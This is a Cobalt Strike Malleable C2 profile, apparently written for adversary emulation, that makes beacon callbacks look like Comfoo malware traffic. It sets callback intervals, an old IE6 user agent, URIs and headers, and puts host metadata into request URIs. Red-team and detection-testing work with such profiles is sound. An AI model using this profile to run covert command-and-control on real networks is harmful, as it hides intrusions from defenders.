#
# Comfoo profile
#   http://www.secureworks.com/cyber-threat-intelligence/threats/secrets-of-the-comfoo-masters/
#
# Author: @harmj0y
#

set sleeptime "30000"; # use a ~30s delay between callbacks
set jitter    "20";
set maxdns    "255";
set useragent "Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)";

http-get {

    set uri "/CWoNaJLBo/VTNeWw11212/";

    client {

        header "Accept" "image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*";
        header "Accept-Language" "en-en";
        header "Connection" "Keel-Alive";
        header "Cache-Control" "no-cache";

        metadata {
            netbiosu;
            append "/UTWOqVQ132/";
            uri-append;
        }
    }

    server {

        header "Server" "Apache/2.0.50 (Unix)";
        header "Keep-Alive" "timeout=15, max=90";

        output {
            print;
        }
    }
}

http-post {

    set uri "/CWoNaJLBo/VTNeWw11213/";

    client {

        header "Accept" "image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*";
        header "Accept-Language" "en-en";
        header "Connection" "Keel-Alive";
        header "Cache-Control" "no-cache";

        id {
            netbiosu;
            append "/UTWOqVQ132/";
            uri-append;
        }

        output {
            print;
        }
    }

    server {

        header "Server" "Apache/2.0.50 (Unix)";
        header "Keep-Alive" "timeout=15, max=90";

        output {
            base64;
            print;
        }
    }
}

